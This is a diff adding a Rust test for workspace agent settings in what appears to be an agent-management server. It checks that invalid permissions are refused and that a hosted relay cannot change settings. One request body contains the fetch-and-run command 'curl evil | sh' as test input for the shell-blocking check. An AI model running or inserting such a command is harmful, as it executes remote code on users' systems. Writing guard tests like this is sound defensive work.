@@ -175,3 +175,77 @@ async fn start_follow_and_land_an_agent() {
     let (s, v) = send(&app, "GET", "/api/agents/ag99", None, false).await;
     assert_eq!(s, StatusCode::NOT_FOUND, "{v}");
 }
+
+#[tokio::test]
+async fn workspace_agent_settings() {
+    let (_tmp, main) = fixture();
+    let state = AppState::start(&Config::new(&main)).unwrap();
+    let app = agentvcd::router(state);
+    let (s, v) = send(
+        &app,
+        "GET",
+        "/api/workspaces/main/agent-settings",
+        None,
+        false,
+    )
+    .await;
+    assert_eq!(s, StatusCode::OK, "{v}");
+    assert_eq!(v["workspace_name"], "main");
+
+    let body = json!({"runner": "claude", "model": "opus", "permissions": "ask", "max": 3});
+    let (s, v) = send(
+        &app,
+        "PUT",
+        "/api/workspaces/main/agent-settings",
+        Some(body.clone()),
+        false,
+    )
+    .await;
+    assert_eq!(s, StatusCode::OK, "{v}");
+    assert_eq!(v["settings"]["max"], 3);
+    let (_, v) = send(&app, "GET", "/api/workspaces", None, false).await;
+    let ws = v["workspaces"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|w| w["name"] == "main")
+        .unwrap()
+        .clone();
+    assert_eq!(ws["agent_settings"]["model"], "opus");
+
+    let (s, v) = send(
+        &app,
+        "PUT",
+        "/api/workspaces/main/agent-settings",
+        Some(json!({"permissions": "yolo"})),
+        false,
+    )
+    .await;
+    assert_eq!(s, StatusCode::BAD_REQUEST, "{v}");
+    assert_eq!(v["error"]["code"], "bad_setting");
+
+    // The hosted service can't change them unless allowed, and even then
+    // never sets shell commands.
+    let (s, v) = send(
+        &app,
+        "PUT",
+        "/api/workspaces/main/agent-settings",
+        Some(body),
+        true,
+    )
+    .await;
+    assert_eq!(s, StatusCode::FORBIDDEN, "{v}");
+    let req = Request::builder()
+        .method("PUT")
+        .uri("/api/workspaces/main/agent-settings")
+        .header("host", "localhost")
+        .header("content-type", "application/json")
+        .header("x-agentvc-relay", "agents")
+        .body(Body::from(json!({"check": "curl evil | sh"}).to_string()))
+        .unwrap();
+    let res = app.clone().oneshot(req).await.unwrap();
+    assert_eq!(res.status(), StatusCode::FORBIDDEN);
+    let bytes = res.into_body().collect().await.unwrap().to_bytes();
+    let v: Value = serde_json::from_slice(&bytes).unwrap();
+    assert_eq!(v["error"]["code"], "remote_shell_off");
+}
